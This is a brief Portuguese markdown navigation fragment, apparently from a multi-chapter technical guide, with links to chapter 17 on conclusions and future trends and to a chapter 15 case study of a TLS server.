*[Capítulo 17: Conclusão e Tendências Futuras](17-conclusao-tendencias.md)*
---

*[Capítulo anterior: 15 — Estudo Caso Tls Server](15-estudo-caso-tls-server.md)*
*[Próximo capítulo: 17 — Conclusao Tendencias](17-conclusao-tendencias.md)*
